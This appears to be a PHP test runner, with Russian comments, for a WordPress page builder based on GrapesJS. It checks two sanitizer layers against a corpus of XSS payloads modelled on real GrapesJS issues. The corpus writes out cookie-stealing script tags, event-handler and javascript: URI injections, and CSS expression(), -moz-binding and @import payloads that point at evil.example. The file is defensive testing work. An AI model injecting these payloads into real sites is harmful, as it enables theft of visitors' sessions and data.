<?php
/**
 * Спайк 4 (план Phase 0): изолированный whitelist-санитайзер
 * (WPGJBuilder\Sanitize\Sanitizer) + адверсариальный корпус тестов на
 * основе РЕАЛЬНЫХ GrapesJS CVE/issues (builder-analysis.md, раздел 5.3):
 * SNYK-JS-GRAPESJS-2935960, SNYK-JS-GRAPESJS-2342412 (XSS в собственном UI
 * редактора GrapesJS), issue #3082 (XSS в Live Preview через импорт HTML с
 * onload-атрибутом на теге вроде <img>), issue #4076 (инъекция через
 * атрибут компонента, например id, исполняющаяся по клику в live preview).
 *
 * Каждый элемент корпуса прогоняется через ОБА контура:
 *   - Contour1EditorSave  — обычная точка вызова (при сохранении).
 *   - Contour2PrePublish  — вызывается НАПРЯМУЮ, БЕЗ предварительного
 *     вызова Contour1, что симулирует прямой forged REST-запрос на
 *     publish-эндпоинт в обход UI редактора (см. раздел 10 спеки:
 *     "обязателен даже если запрос обошёл обычный UI редактора").
 * Так доказывается независимость контура 2 от контура 1 (контур 2 сам
 * по себе ловит всё то же самое), а сверка байт-в-байт результатов
 * доказывает, что правила ОДНИ И ТЕ ЖЕ — различается только точка вызова
 * (Contour1EditorSave и Contour2PrePublish буквально вызывают одну и ту
 * же Sanitizer::sanitize_html()/sanitize_css()).
 *
 * Не является автоматизированным юнит-тестом (в среде разработки нет
 * PHPUnit) — гоняется вручную через дев-only REST-маршрут
 * DevSpike4Controller. Удалить перед Phase 7 (приёмка MVP), см. план:
 * "Критические файлы".
 *
 * ВАЖНО: CSS-санитайзер (Sanitizer::sanitize_css) — САМОПИСНЫЙ,
 * СПАЙК-КАЧЕСТВА валидатор (regex/токенизатор), НЕ полноценный CSS-парсер
 * — см. предупреждение в шапке includes/Sanitize/Sanitizer.php. Он ловит
 * весь корпус ниже, но к Phase 6 должен быть заменён на парсер-based
 * реализацию (например, sabberworm/php-css-parser), когда появится
 * реальное PHP+Composer окружение.
 */

namespace WPGJBuilder\Tests\Spikes;

use WPGJBuilder\Sanitize\Contour1EditorSave;
use WPGJBuilder\Sanitize\Contour2PrePublish;
use WPGJBuilder\Sanitize\Sanitizer;

defined( 'ABSPATH' ) || exit;

class Spike4Runner {

	/**
	 * Адверсариальный корпус. Каждый элемент — {name, payload, expected}
	 * плюс служебные поля для автоматической проверки результата:
	 * - kind: 'html' | 'css'
	 * - allowed_tags / allowed_css_properties: whitelist для этого элемента
	 * - forbidden_markers: подстроки, которые НЕ ДОЛЖНЫ встретиться в
	 *   выводе, если expected === 'blocked' (регистронезависимо)
	 * - expected_contains: подстроки, которые ДОЛЖНЫ встретиться в выводе
	 *   без изменений, если expected === 'allowed'
	 * - cve_ref: ссылка на конкретный CVE/issue из builder-analysis.md 5.3
	 */
	private static function corpus() {
		return array(
			array(
				'name'              => 'script_tag',
				'cve_ref'           => 'generic XSS (script injection), контур защиты общий для SNYK-JS-GRAPESJS-2935960/2342412',
				'kind'              => 'html',
				'payload'           => '<script>alert(document.cookie)</script>',
				'allowed_tags'      => Sanitizer::richness_rich_text(),
				'expected'          => 'blocked',
				'forbidden_markers' => array( '<script' ),
			),
			array(
				'name'              => 'img_onload_issue_3082',
				'cve_ref'           => 'GitHub issue #3082 — XSS в Live Preview через импорт HTML с onload на <img>',
				'kind'              => 'html',
				'payload'           => '<img src="photo.png" onload="alert(document.cookie)">',
				'allowed_tags'      => Sanitizer::richness_image(),
				'expected'          => 'blocked',
				'forbidden_markers' => array( 'onload' ),
			),
			array(
				'name'              => 'component_id_attr_issue_4076',
				'cve_ref'           => 'GitHub issue #4076 — инъекция через атрибут компонента (id), исполняется по клику в live preview',
				'kind'              => 'html',
				'payload'           => '<a id="onclick=alert(1)" href="#" onclick="alert(document.cookie)">Кнопка</a>',
				'allowed_tags'      => Sanitizer::richness_rich_text(),
				'expected'          => 'blocked',
				'forbidden_markers' => array( 'onclick', ' id=' ),
			),
			array(
				'name'              => 'href_javascript_uri_issue_4076_variant',
				'cve_ref'           => 'GitHub issue #4076 — тот же класс: javascript: URI как "атрибут компонента"',
				'kind'              => 'html',
				'payload'           => '<a id="btn1" href="javascript:alert(document.cookie)">Клик</a>',
				'allowed_tags'      => Sanitizer::richness_rich_text(),
				'expected'          => 'blocked',
				'forbidden_markers' => array( 'javascript:' ),
			),
			array(
				'name'              => 'css_expression',
				'cve_ref'           => 'легаси-вектор CSS-инъекции (IE expression()), явный запрет по плану раздела 10',
				'kind'              => 'css',
				'payload'           => 'font-size: expression(alert(document.cookie));',
				'allowed_css_properties' => Sanitizer::CSS_PROPERTIES_BASIC,
				'expected'          => 'blocked',
				'forbidden_markers' => array( 'expression' ),
			),
			array(
				'name'              => 'css_moz_binding',
				'cve_ref'           => 'легаси-вектор CSS-инъекции (-moz-binding), явный запрет по плану раздела 10',
				'kind'              => 'css',
				'payload'           => '-moz-binding: url("http://evil.example/xss.xml#xss");',
				'allowed_css_properties' => Sanitizer::CSS_PROPERTIES_BASIC,
				'expected'          => 'blocked',
				'forbidden_markers' => array( 'moz-binding' ),
			),
			array(
				'name'              => 'css_at_import',
				'cve_ref'           => 'легаси-вектор CSS-инъекции (@import), явный запрет по плану раздела 10',
				'kind'              => 'css',
				'payload'           => '@import url("http://evil.example/evil.css");',
				'allowed_css_properties' => Sanitizer::CSS_PROPERTIES_BASIC,
				'expected'          => 'blocked',
				'forbidden_markers' => array( '@import' ),
			),
			array(
				'name'              => 'css_javascript_url_in_property',
				'cve_ref'           => 'легаси-вектор CSS-инъекции (javascript: внутри url())',
				'kind'              => 'css',
				'payload'           => 'background-image: url(javascript:alert(document.cookie));',
				'allowed_css_properties' => array( 'background-image' ),
				'expected'          => 'blocked',
				'forbidden_markers' => array( 'javascript:' ),
			),
			array(
				'name'               => 'safe_rich_text_bold',
				'cve_ref'            => 'контрольный пример: легитимный контент НЕ должен блокироваться',
				'kind'               => 'html',
				'payload'            => '<strong>bold</strong>',
				'allowed_tags'       => Sanitizer::richness_rich_text(),
				'expected'           => 'allowed',
				'expected_contains'  => array( '<strong>bold</strong>' ),
			),
			array(
				'name'               => 'safe_css_declaration',
				'cve_ref'            => 'контрольный пример: легитимный CSS НЕ должен блокироваться',
				'kind'               => 'css',
				'payload'            => 'color: #ff0000; font-size: 16px;',
				'allowed_css_properties' => Sanitizer::CSS_PROPERTIES_BASIC,
				'expected'           => 'allowed',
				'expected_contains'  => array( 'color: #ff0000;', 'font-size: 16px;' ),
			),
		);
	}

	public static function run() {
		$results = array();

		$results['corpus_via_contour1_normal_flow']        = self::check_corpus_via_contour1();
		$results['corpus_via_contour2_bypassing_contour1']  = self::check_corpus_via_contour2_bypass();
		$results['contour1_contour2_rule_parity']           = self::check_contour_parity();
		$results['safe_payloads_not_overblocked']           = self::check_safe_payloads();

		return $results;
	}

	/** Прогон всего корпуса через контур 1 (обычная точка вызова — сохранение). */
	private static function check_corpus_via_contour1() {
		$items = array();
		$all_pass = true;

		foreach ( self::corpus() as $case ) {
			$sanitized = self::run_case_through_contour( $case, 'contour1' );
			$pass      = self::case_matches_expectation( $case, $sanitized );
			$all_pass  = $all_pass && $pass;

			$items[] = array(
				'name'   => $case['name'],
				'pass'   => $pass,
				'output' => $sanitized,
			);
		}

		return array(
			'pass'   => $all_pass,
			'detail' => $all_pass
				? 'Контур 1: все ' . count( $items ) . ' элементов корпуса дали ожидаемый результат (blocked/allowed).'
				: 'Контур 1: как минимум один элемент корпуса дал неожиданный результат — см. result.',
			'result' => $items,
		);
	}

	/**
	 * Прогон ВСЕГО корпуса через контур 2 НАПРЯМУЮ, БЕЗ предварительного
	 * вызова контура 1 — симуляция прямого forged REST-вызова на
	 * publish-эндпоинт, который полностью пропускает UI редактора (и,
	 * следовательно, контур 1). Если этот чек проходит — контур 2 ловит
	 * все адверсариальные паттерны САМОСТОЯТЕЛЬНО, независимо от контура 1.
	 */
	private static function check_corpus_via_contour2_bypass() {
		$items = array();
		$all_pass = true;

		foreach ( self::corpus() as $case ) {
			$sanitized = self::run_case_through_contour( $case, 'contour2' );
			$pass      = self::case_matches_expectation( $case, $sanitized );
			$all_pass  = $all_pass && $pass;

			$items[] = array(
				'name'   => $case['name'],
				'pass'   => $pass,
				'output' => $sanitized,
			);
		}

		return array(
			'pass'   => $all_pass,
			'detail' => $all_pass
				? 'Контур 2, вызванный НАПРЯМУЮ (без контура 1) — все ' . count( $items ) . ' элементов корпуса всё равно дали ожидаемый результат. Доказывает независимость контура 2 от того, прошёл ли документ через контур 1 (защита от forged REST-вызова в обход редактора).'
				: 'Контур 2 в одиночку не поймал как минимум один адверсариальный паттерн — критический провал приёмочного критерия №7 (раздел 15 спеки).',
			'result' => $items,
		);
	}

	/**
	 * Контур 1 и контур 2 должны давать БАЙТ-В-БАЙТ идентичный результат
	 * на каждом элементе корпуса — доказывает "различается только точка
	 * вызова, не правила" (план, раздел "Репозиторий и файловая структура").
	 */
	private static function check_contour_parity() {
		$items = array();
		$all_pass = true;

		foreach ( self::corpus() as $case ) {
			$out1 = self::run_case_through_contour( $case, 'contour1' );
			$out2 = self::run_case_through_contour( $case, 'contour2' );
			$pass = $out1 === $out2;
			$all_pass = $all_pass && $pass;

			$items[] = array(
				'name'            => $case['name'],
				'pass'            => $pass,
				'contour1_output' => $out1,
				'contour2_output' => $out2,
			);
		}

		return array(
			'pass'   => $all_pass,
			'detail' => $all_pass
				? 'Contour1EditorSave и Contour2PrePublish дали идентичный вывод на всех ' . count( $items ) . ' элементах корпуса — оба вызывают одну и ту же Sanitizer-логику.'
				: 'Contour1EditorSave и Contour2PrePublish разошлись в результате хотя бы на одном элементе — нарушение требования "одна и та же логика, разная точка вызова".',
			'result' => $items,
		);
	}

	/** Явная проверка "не всё подряд блокируется": легитимный контент проходит без изменений. */
	private static function check_safe_payloads() {
		$safe_cases = array_filter(
			self::corpus(),
			function ( $case ) {
				return 'allowed' === $case['expected'];
			}
		);

		$items = array();
		$all_pass = true;

		foreach ( $safe_cases as $case ) {
			$out1 = self::run_case_through_contour( $case, 'contour1' );
			$out2 = self::run_case_through_contour( $case, 'contour2' );
			$pass = self::case_matches_expectation( $case, $out1 ) && self::case_matches_expectation( $case, $out2 );
			$all_pass = $all_pass && $pass;

			$items[] = array(
				'name'   => $case['name'],
				'pass'   => $pass,
				'output' => $out1,
			);
		}

		return array(
			'pass'   => $all_pass,
			'detail' => $all_pass
				? 'Легитимные payload (' . count( $items ) . ') проходят оба контура без изменений — санитайзер не является тотальным запретом всего подряд.'
				: 'Как минимум один легитимный payload был излишне заблокирован/изменён.',
			'result' => $items,
		);
	}

	/** @return string HTML или CSS вывод, в зависимости от case['kind']. */
	private static function run_case_through_contour( array $case, string $contour ) {
		$html                   = 'html' === $case['kind'] ? $case['payload'] : '';
		$css                    = 'css' === $case['kind'] ? $case['payload'] : '';
		$allowed_tags           = $case['allowed_tags'] ?? array();
		$allowed_css_properties = $case['allowed_css_properties'] ?? array();

		if ( 'contour1' === $contour ) {
			$result = Contour1EditorSave::sanitize_document( $html, $css, $allowed_tags, $allowed_css_properties );
		} else {
			$result = Contour2PrePublish::sanitize_document( $html, $css, $allowed_tags, $allowed_css_properties );
		}

		return 'html' === $case['kind'] ? $result['html'] : $result['css'];
	}

	private static function case_matches_expectation( array $case, $sanitized_output ) {
		if ( 'blocked' === $case['expected'] ) {
			foreach ( $case['forbidden_markers'] as $marker ) {
				if ( false !== stripos( $sanitized_output, $marker ) ) {
					return false;
				}
			}
			return true;
		}

		// expected === 'allowed'
		foreach ( $case['expected_contains'] as $needle ) {
			if ( false === strpos( $sanitized_output, $needle ) ) {
				return false;
			}
		}
		return true;
	}
}
